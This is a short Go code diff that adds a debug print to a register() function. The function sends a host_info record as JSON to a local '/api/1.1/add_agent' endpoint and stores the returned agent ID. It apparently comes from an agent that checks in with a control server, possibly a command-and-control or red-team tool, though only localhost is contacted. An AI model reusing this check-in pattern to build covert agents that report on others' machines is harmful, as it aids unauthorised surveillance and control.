@@ -37,6 +37,7 @@ func register() string {
 	}
 	postBody, _ := json.Marshal(host_info)
 	responseBody := bytes.NewBuffer(postBody)
+	fmt.Printf("%s\n", responseBody)
 	resp_register, _ := http.Post("http://127.0.0.1:5000/api/1.1/add_agent", "application/json", responseBody)
 	body2, _ := ioutil.ReadAll(resp_register.Body)
 	agent_id := string(body2)
